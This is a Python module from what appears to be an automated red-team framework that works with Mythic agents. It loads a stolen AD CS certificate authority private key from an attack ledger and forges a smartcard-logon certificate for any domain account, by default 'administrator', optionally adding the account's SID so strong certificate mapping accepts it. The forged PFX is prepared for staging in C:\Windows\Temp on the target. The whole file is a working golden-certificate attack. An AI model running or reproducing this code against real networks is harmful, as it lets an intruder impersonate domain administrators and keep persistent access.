"""Runtime materialization for ADCS certificate-auth capabilities.

The capability layer is intentionally payload-agnostic: it says "use verified CA
signing material to obtain a PKINIT ticket", not how a given Mythic agent should
stage files. This module handles the local, deterministic artifact step shared by
all Mythic backends: resolve a verified CA artifact from the durable ledger,
forge a Windows PKINIT/smartcard-style account PFX, and return builder-ready
inputs. Mythic-specific staging is done by MythicTools after this module returns.
"""

from __future__ import annotations

import base64
from dataclasses import dataclass, field
import hashlib
import os
from pathlib import Path
import re
from typing import Any


@dataclass
class CertificateAuthMaterialization:
    ok: bool
    inputs: dict[str, Any] = field(default_factory=dict)
    evidence: dict[str, Any] = field(default_factory=dict)
    missing: list[str] = field(default_factory=list)
    reason: str = ""


KEY_RE = re.compile(
    rb"-----BEGIN (?:RSA |EC |DSA |)PRIVATE KEY-----[\s\S]+?-----END (?:RSA |EC |DSA |)PRIVATE KEY-----",
    re.IGNORECASE,
)
CERT_RE = re.compile(rb"-----BEGIN CERTIFICATE-----[\s\S]+?-----END CERTIFICATE-----", re.IGNORECASE)

_CA_ARTIFACT_KEYS = (
    "pfx_artifact_path",
    "ca_pfx_artifact_path",
    "ca_artifact_path",
    "artifact_path",
    "local_artifact_path",
    "private_key_artifact_path",
)


def materialize_adcs_certificate_auth(
    *,
    ledger: dict[str, Any],
    artifact_dir: str | os.PathLike[str],
    engagement_key: str,
    domain: str,
    account: str,
    ca_host: str,
    callback_id: str,
    account_sid: str = "",
    sid_extension_encoding: str = "utf8",
    ca_pfx_password: str = "",
    forged_pfx_password: str = "",
    remote_forged_pfx_path: str = "",
) -> CertificateAuthMaterialization:
    """Forge a certificate-auth PFX from a verified CA artifact.

    A CA artifact is accepted only when the ledger has an achieved
    ``adcs-ca-private-key:<ca>@<domain>`` effect. The artifact directory is used
    as a path resolver for that verified fact, not as independent proof.
    """

    domain = _normalize(domain)
    account = _normalize(account) or "administrator"
    ca_host = _host_short(ca_host)
    callback_id = _normalize_callback(callback_id)
    missing = []
    if not domain:
        missing.append("domain")
    if not account:
        missing.append("account")
    if not ca_host:
        missing.append("ca_host")
    if not callback_id:
        missing.append("callback_id")
    if missing:
        return CertificateAuthMaterialization(False, missing=missing, reason="missing certificate-auth materialization input")

    slug = _slug("_".join(part for part in (account, domain, callback_id) if part))
    try:
        from . import capabilities as _caps
    except ImportError:
        import capabilities as _caps
    # Per-run, non-source-visible artifact passwords. CA export uses SagePfx plus an export-context slug;
    # certificate auth may run later with only ledger evidence, so try inferred export passwords and skip
    # artifacts that cannot actually be opened instead of selecting by filename alone.
    ca_pfx_passwords = _ca_pfx_password_values(
        ledger,
        ca_host=ca_host,
        domain=domain,
        current_callback_id=callback_id,
        certificate_slug=slug,
        explicit_password=ca_pfx_password,
        caps_module=_caps,
    )
    forged_pfx_password = forged_pfx_password or _caps.artifact_secret("SageCert", slug)
    remote_forged_pfx_path = remote_forged_pfx_path or f"C:\\Windows\\Temp\\sage_forged_cert_{slug}.pfx"
    subject_hint = f"{domain.split('.', 1)[0]}-ca"

    artifact_root = Path(artifact_dir)
    ca_artifact, ca_hop = resolve_verified_ca_artifact(
        ledger,
        artifact_root,
        ca_host,
        domain,
        ca_pfx_password=ca_pfx_passwords,
        subject_hint=subject_hint,
        engagement_key=engagement_key,
    )
    if not ca_artifact:
        return CertificateAuthMaterialization(
            False,
            missing=["adcs_ca_private_key_artifact"],
            reason=f"no verified usable CA private-key artifact for {ca_host}@{domain}",
        )

    try:
        pfx, forged_sha256, forged_subject, ca_subject = forge_account_pfx(
            ca_artifact,
            ca_pfx_password=ca_pfx_passwords,
            subject_hint=subject_hint,
            account=account,
            domain=domain,
            account_sid=account_sid,
            sid_extension_encoding=sid_extension_encoding,
            forged_password=forged_pfx_password,
        )
    except Exception as exc:
        return CertificateAuthMaterialization(
            False,
            missing=["adcs_ca_private_key_artifact"],
            reason=f"verified CA artifact could not be used for certificate auth: {exc}",
        )
    local_path = _write_forged_pfx(artifact_root, engagement_key, ca_host, domain, account, pfx)
    ca_artifact_sha256 = hashlib.sha256(ca_artifact.read_bytes()).hexdigest()

    inputs = {
        "domain": domain,
        "target_domain": domain,
        "account": account,
        "ca_host": ca_host,
        "callback_id": callback_id,
        "certificate_already_forged": True,
        "forged_pfx_path": remote_forged_pfx_path,
        "forged_pfx_password": forged_pfx_password,
        "_local_forged_pfx_path": str(local_path),
        "_ca_artifact_path": str(ca_artifact),
    }
    if account_sid:
        inputs["account_sid"] = account_sid
    evidence = {
        "source": "adcs_certificate_materializer",
        "certificate_profile": "windows-pkinit-smartcard-logon",
        "ca_host": ca_host,
        "domain": domain,
        "account": account,
        "account_sid": account_sid,
        "callback_id": callback_id,
        "ca_subject": ca_subject,
        "ca_artifact_path": str(ca_artifact),
        "ca_artifact_sha256": ca_artifact_sha256,
        "forged_subject": forged_subject,
        "forged_pfx_artifact_path": str(local_path),
        "forged_pfx_sha256": forged_sha256,
        "remote_forged_pfx_path": remote_forged_pfx_path,
        "verified_effect": _ca_effect(ca_host, domain),
        "verified_hop_id": str(ca_hop.get("id") or ""),
    }
    return CertificateAuthMaterialization(True, inputs=inputs, evidence=evidence, reason="materialized forged certificate PFX")


def resolve_verified_ca_artifact(
    ledger: dict[str, Any],
    artifact_dir: Path,
    ca_host: str,
    domain: str,
    ca_pfx_password: str | list[str] | tuple[str, ...] | set[str] = "",
    subject_hint: str = "",
    engagement_key: str = "",
) -> tuple[Path | None, dict[str, Any]]:
    ca_host = _host_short(ca_host)
    domain = _normalize(domain)
    effect = _ca_effect(ca_host, domain)
    for hop in reversed(list(ledger.get("hops") or [])):
        if not isinstance(hop, dict):
            continue
        if str(hop.get("status") or "").casefold() != "achieved":
            continue
        effects = {str(hop.get("effect") or "").casefold()}
        effects.update(str(item or "").casefold() for item in hop.get("satisfied_effects") or [])
        if effect not in effects:
            continue
        evidence = hop.get("evidence") if isinstance(hop.get("evidence"), dict) else {}
        candidates = []
        candidates.extend(_candidate_paths(evidence))
        candidates.extend(_embedded_pfx_candidate_paths(evidence, artifact_dir, engagement_key, ca_host, domain))
        candidates.extend(ca_artifact_candidates(artifact_dir, ca_host, domain, engagement_key=engagement_key))
        for path in _dedupe_paths(candidates):
            if not path.is_file():
                continue
            if subject_hint:
                try:
                    load_ca_key_cert_from_artifact(path, ca_pfx_password, subject_hint)
                except Exception:
                    continue
            return path, hop
        return None, hop
    return None, {}


def latest_ca_artifact(artifact_dir: Path, ca_host: str, domain: str) -> Path | None:
    candidates = ca_artifact_candidates(artifact_dir, ca_host, domain)
    return candidates[0] if candidates else None


def ca_artifact_candidates(
    artifact_dir: Path,
    ca_host: str,
    domain: str,
    *,
    engagement_key: str = "",
) -> list[Path]:
    ca_host = _host_short(ca_host)
    domain = _normalize(domain)
    if not artifact_dir.is_dir():
        return []
    engagement_slug = _slug(engagement_key) if engagement_key else ""
    candidates = [
        path for path in artifact_dir.glob("adcs_ca_*")
        if ca_host in path.name.casefold()
        and domain in path.name.casefold()
        and path.suffix.casefold() in {".pfx", ".txt", ".pem", ".cer", ".crt"}
    ]
    candidates.sort(
        key=lambda path: (
            bool(engagement_slug and engagement_slug in path.name.casefold()),
            path.stat().st_mtime,
        ),
        reverse=True,
    )
    return candidates


def forge_account_pfx(
    artifact: Path,
    *,
    ca_pfx_password: str | list[str] | tuple[str, ...] | set[str],
    subject_hint: str,
    account: str,
    domain: str,
    forged_password: str,
    account_sid: str = "",
    sid_extension_encoding: str = "utf8",
) -> tuple[bytes, str, str, str]:
    from datetime import datetime, timedelta, timezone

    from cryptography import x509
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.primitives.serialization import pkcs12
    from cryptography.x509.oid import ExtendedKeyUsageOID, NameOID, ObjectIdentifier

    ca_key, ca_cert, ca_subject = load_ca_key_cert_from_artifact(artifact, ca_pfx_password, subject_hint)
    cert_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    account = _normalize(account)
    domain = _normalize(domain)
    upn = f"{account}@{domain}"
    now = datetime.now(timezone.utc)
    builder = (
        x509.CertificateBuilder()
        .subject_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, account)]))
        .issuer_name(ca_cert.subject)
        .public_key(cert_key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(now - timedelta(days=1))
        .not_valid_after(now + timedelta(days=365))
        .add_extension(
            x509.SubjectAlternativeName([
                x509.OtherName(ObjectIdentifier("1.3.6.1.4.1.311.20.2.3"), _der_utf8_string(upn)),
                x509.RFC822Name(upn),
            ]),
            critical=False,
        )
        .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
        .add_extension(x509.SubjectKeyIdentifier.from_public_key(cert_key.public_key()), critical=False)
        .add_extension(_authority_key_identifier(ca_cert, ca_key), critical=False)
        .add_extension(_crl_distribution_points(ca_cert), critical=False)
        .add_extension(
            x509.ExtendedKeyUsage([
                ExtendedKeyUsageOID.CLIENT_AUTH,
                ObjectIdentifier("1.3.6.1.4.1.311.20.2.2"),
            ]),
            critical=False,
        )
        .add_extension(
            x509.KeyUsage(
                digital_signature=True,
                content_commitment=False,
                key_encipherment=True,
                data_encipherment=False,
                key_agreement=False,
                key_cert_sign=False,
                crl_sign=False,
                encipher_only=False,
                decipher_only=False,
            ),
            critical=True,
        )
    )
    if account_sid:
        builder = builder.add_extension(
            _ntds_ca_security_extension(account_sid, sid_extension_encoding),
            critical=False,
        )
    cert = builder.sign(private_key=ca_key, algorithm=hashes.SHA256())
    algorithm = (
        serialization.BestAvailableEncryption(forged_password.encode())
        if forged_password else serialization.NoEncryption()
    )
    pfx = pkcs12.serialize_key_and_certificates(
        name=upn.encode("utf-8"),
        key=cert_key,
        cert=cert,
        cas=[ca_cert],
        encryption_algorithm=algorithm,
    )
    return pfx, hashlib.sha256(pfx).hexdigest(), cert.subject.rfc4514_string(), ca_subject


def load_ca_key_cert_from_artifact(
    artifact: Path,
    pfx_password: str | list[str] | tuple[str, ...] | set[str],
    subject_hint: str,
):
    from cryptography import x509
    from cryptography.hazmat.primitives import serialization
    from cryptography.hazmat.primitives.serialization import pkcs12

    data = artifact.read_bytes()
    if artifact.suffix.casefold() == ".pfx":
        errors = []
        for password in _pfx_password_candidates(pfx_password):
            try:
                key, cert, _cas = pkcs12.load_key_and_certificates(data, password)
                if key is None or cert is None:
                    raise ValueError("PFX does not contain a private key/certificate pair")
                return key, cert, cert.subject.rfc4514_string()
            except Exception as exc:
                errors.append(str(exc))
        raise ValueError(f"{artifact} could not be opened as a CA PFX: {'; '.join(errors[-2:])}")

    keys = [(match.start(), match.group(0)) for match in KEY_RE.finditer(data)]
    certs = [(match.start(), match.group(0)) for match in CERT_RE.finditer(data)]
    if not keys or not certs:
        raise ValueError(f"{artifact} does not contain PEM private key and certificate material")

    candidates = []
    for cert_pos, cert_pem in certs:
        cert = x509.load_pem_x509_certificate(cert_pem)
        subject = cert.subject.rfc4514_string()
        issuer = cert.issuer.rfc4514_string()
        is_ca = issuer == subject
        try:
            is_ca = bool(cert.extensions.get_extension_for_class(x509.BasicConstraints).value.ca or is_ca)
        except Exception:
            pass
        preceding = [(pos, pem) for pos, pem in keys if pos < cert_pos]
        if not preceding:
            continue
        key = serialization.load_pem_private_key(preceding[-1][1], password=None)
        try:
            key_matches = _public_key_bytes(key) == cert.public_key().public_bytes(
                serialization.Encoding.DER,
                serialization.PublicFormat.SubjectPublicKeyInfo,
            )
        except Exception:
            key_matches = False
        if not key_matches:
            continue
        score = 0
        if is_ca:
            score += 10
        if subject_hint and subject_hint.casefold() in subject.casefold():
            score += 5
        if "ca" in subject.casefold():
            score += 1
        candidates.append((score, subject, key, cert))
    if not candidates:
        raise ValueError(f"{artifact} did not contain a matching CA private key/certificate pair")
    candidates.sort(key=lambda item: item[0], reverse=True)
    _score, subject, key, cert = candidates[0]
    return key, cert, subject


def _write_forged_pfx(artifact_dir: Path, engagement_key: str, ca_host: str, domain: str, account: str, pfx: bytes) -> Path:
    artifact_dir.mkdir(parents=True, exist_ok=True)
    slug = _slug("_".join(part for part in (engagement_key, ca_host, domain, account) if part))
    path = artifact_dir / f"adcs_forged_cert_{slug}.pfx"
    path.write_bytes(pfx)
    return path


def _candidate_paths(evidence: dict[str, Any]) -> list[Path]:
    paths = []
    for source in _evidence_sources(evidence):
        for key in _CA_ARTIFACT_KEYS:
            text = str(source.get(key) or "").strip()
            if text:
                paths.append(Path(text))
    return paths


def _embedded_pfx_candidate_paths(
    evidence: dict[str, Any],
    artifact_dir: Path,
    engagement_key: str,
    ca_host: str,
    domain: str,
) -> list[Path]:
    paths = []
    for source in _evidence_sources(evidence):
        b64 = _first_text(source, "pfx_base64", "ca_pfx_base64", "PFX_BASE64")
        if not b64:
            continue
        try:
            blob = base64.b64decode(re.sub(r"\s+", "", b64), validate=True)
        except Exception:
            continue
        if len(blob) < 256 or blob[:1] != b"0":
            continue
        expected_sha = _first_text(source, "pfx_sha256", "ca_pfx_sha256", "PFX_SHA256").casefold()
        sha = hashlib.sha256(blob).hexdigest()
        if expected_sha and expected_sha != sha:
            continue
        artifact_dir.mkdir(parents=True, exist_ok=True)
        slug = _slug("_".join(part for part in (engagement_key, ca_host, domain, sha[:16]) if part))
        path = artifact_dir / f"adcs_ca_signing_{slug}.pfx"
        if not path.is_file() or hashlib.sha256(path.read_bytes()).hexdigest() != sha:
            path.write_bytes(blob)
        paths.append(path)
    return paths


def _evidence_sources(evidence: dict[str, Any]) -> list[dict[str, Any]]:
    sources = [evidence] if isinstance(evidence, dict) else []
    for key in ("probe", "verification", "materialized", "artifact", "artifacts"):
        value = evidence.get(key) if isinstance(evidence, dict) else None
        if isinstance(value, dict):
            sources.append(value)
    return sources


def _first_text(source: dict[str, Any], *keys: str) -> str:
    for key in keys:
        value = source.get(key) if isinstance(source, dict) else None
        if value is None:
            continue
        text = str(value).strip()
        if text:
            return text
    return ""


def _dedupe_paths(paths: list[Path]) -> list[Path]:
    out = []
    seen = set()
    for path in paths:
        key = str(path)
        if key in seen:
            continue
        seen.add(key)
        out.append(path)
    return out


def _public_key_bytes(value: Any) -> bytes:
    from cryptography.hazmat.primitives import serialization

    return value.public_key().public_bytes(
        serialization.Encoding.DER,
        serialization.PublicFormat.SubjectPublicKeyInfo,
    )


def _authority_key_identifier(ca_cert: Any, ca_key: Any) -> Any:
    from cryptography import x509

    try:
        issuer_ski = ca_cert.extensions.get_extension_for_class(x509.SubjectKeyIdentifier).value
        return x509.AuthorityKeyIdentifier.from_issuer_subject_key_identifier(issuer_ski)
    except Exception:
        return x509.AuthorityKeyIdentifier.from_issuer_public_key(ca_key.public_key())


def _crl_distribution_points(ca_cert: Any) -> Any:
    from cryptography import x509

    try:
        return ca_cert.extensions.get_extension_for_class(x509.CRLDistributionPoints).value
    except Exception:
        return x509.CRLDistributionPoints([
            x509.DistributionPoint(
                full_name=[x509.UniformResourceIdentifier("ldap:///")],
                relative_name=None,
                reasons=None,
                crl_issuer=None,
            )
        ])


def _der_utf8_string(value: str) -> bytes:
    data = value.encode("utf-8")
    if len(data) < 128:
        return b"\x0c" + bytes([len(data)]) + data
    length = len(data).to_bytes((len(data).bit_length() + 7) // 8, "big")
    return b"\x0c" + bytes([0x80 | len(length)]) + length + data


def _ntds_ca_security_extension(account_sid: str, encoding: str = "utf8"):
    from cryptography import x509
    from cryptography.x509.oid import ObjectIdentifier

    value = _der_octet_string(_sid_to_bytes(account_sid)) if str(encoding).casefold() in {"binary", "octet", "octet-string"} else _der_utf8_string(account_sid)
    other_name = _der_sequence(
        _der_oid("1.3.6.1.4.1.311.25.2.1")
        + _der_context_explicit(0, value)
    )
    return x509.UnrecognizedExtension(ObjectIdentifier("1.3.6.1.4.1.311.25.2"), other_name)


def _der_octet_string(value: bytes) -> bytes:
    return b"\x04" + _der_length(len(value)) + value


def _sid_to_bytes(value: str) -> bytes:
    parts = str(value or "").strip().split("-")
    if len(parts) < 3 or parts[0] != "S":
        raise ValueError("invalid SID")
    revision = int(parts[1])
    identifier_authority = int(parts[2])
    sub_authorities = [int(part) for part in parts[3:]]
    if len(sub_authorities) > 255:
        raise ValueError("too many SID subauthorities")
    out = bytearray([revision, len(sub_authorities)])
    out.extend(identifier_authority.to_bytes(6, "big"))
    for sub_authority in sub_authorities:
        out.extend(sub_authority.to_bytes(4, "little"))
    return bytes(out)


def _der_sequence(value: bytes) -> bytes:
    return b"\x30" + _der_length(len(value)) + value


def _der_context_explicit(index: int, value: bytes) -> bytes:
    return bytes([0xA0 + index]) + _der_length(len(value)) + value


def _der_oid(value: str) -> bytes:
    parts = [int(part) for part in value.split(".")]
    if len(parts) < 2:
        raise ValueError("OID must have at least two arcs")
    encoded = bytearray([40 * parts[0] + parts[1]])
    for part in parts[2:]:
        stack = [part & 0x7F]
        part >>= 7
        while part:
            stack.append(0x80 | (part & 0x7F))
            part >>= 7
        encoded.extend(reversed(stack))
    return b"\x06" + _der_length(len(encoded)) + bytes(encoded)


def _der_length(length: int) -> bytes:
    if length < 128:
        return bytes([length])
    raw = length.to_bytes((length.bit_length() + 7) // 8, "big")
    return bytes([0x80 | len(raw)]) + raw


def _ca_pfx_password_values(
    ledger: dict[str, Any],
    *,
    ca_host: str,
    domain: str,
    current_callback_id: str,
    certificate_slug: str,
    explicit_password: str,
    caps_module: Any,
) -> list[str]:
    values: list[str] = []

    def add(value: Any) -> None:
        text = str(value or "").strip()
        if text and text not in values:
            values.append(text)

    add(explicit_password)
    add(os.environ.get("SAGE_ADCS_CA_PFX_PASSWORD"))
    effect = _ca_effect(ca_host, domain)
    for hop in reversed(list(ledger.get("hops") or [])):
        if not isinstance(hop, dict):
            continue
        effects = {str(hop.get("effect") or "").casefold()}
        effects.update(str(item or "").casefold() for item in hop.get("satisfied_effects") or [])
        if effect not in effects:
            continue
        for callback_id in _hop_callback_ids(hop):
            add(caps_module.artifact_secret("SagePfx", _slug("_".join(part for part in (ca_host, callback_id) if part))))
        break
    add(caps_module.artifact_secret("SagePfx", _slug("_".join(part for part in (ca_host, current_callback_id) if part))))
    add(caps_module.artifact_secret("SagePfx", _slug(ca_host)))
    # Backward-compatible candidates for older exported artifacts and prior materializer defaults.
    add(caps_module.artifact_secret("SageCA", certificate_slug))
    add(caps_module.artifact_secret("SageCA"))
    return values


def _hop_callback_ids(hop: dict[str, Any]) -> list[str]:
    ids: list[str] = []

    def add(value: Any) -> None:
        callback_id = _normalize_callback(value)
        if callback_id and callback_id not in ids:
            ids.append(callback_id)

    add(hop.get("callback_id") or hop.get("callback"))
    for match in re.findall(r"(?:^|[;:_-])callback=?((?:cb)?\d+)", str(hop.get("id") or ""), re.IGNORECASE):
        add(match)
    evidence = hop.get("evidence") if isinstance(hop.get("evidence"), dict) else {}
    for source in _evidence_sources(evidence):
        add(source.get("callback_id") or source.get("callback") or source.get("callback_display_id"))
    return ids


def _pfx_password_candidates(value: str | list[str] | tuple[str, ...] | set[str]) -> list[bytes | None]:
    out: list[bytes | None] = []
    values = list(value) if isinstance(value, (list, tuple, set)) else [value]
    for item in values:
        text = str(item or "").strip()
        if text:
            out.append(text.encode())
    out.extend([b"", None])
    deduped: list[bytes | None] = []
    for item in out:
        if item not in deduped:
            deduped.append(item)
    return deduped


def _ca_effect(ca_host: str, domain: str) -> str:
    return f"adcs-ca-private-key:{_host_short(ca_host)}@{_normalize(domain)}"


def _host_short(value: Any) -> str:
    text = _normalize(value).strip("\\/")
    if "/" in text and not text.startswith("\\\\"):
        _, _, text = text.partition("/")
    if "@" in text:
        text = text.split("@", 1)[0]
    if text.endswith("$"):
        text = text[:-1]
    return text.split(".", 1)[0].strip()


def _normalize_callback(value: Any) -> str:
    text = _normalize(value)
    if text.startswith("cb") and text[2:].isdigit():
        return text[2:]
    return text if text.isdigit() else ""


def _normalize(value: Any) -> str:
    if value is None:
        return ""
    return " ".join(str(value).strip().casefold().split())


def _slug(value: Any) -> str:
    text = re.sub(r"[^a-zA-Z0-9]+", "_", str(value or "").strip().lower())
    text = re.sub(r"_+", "_", text).strip("_")
    return text or "target"
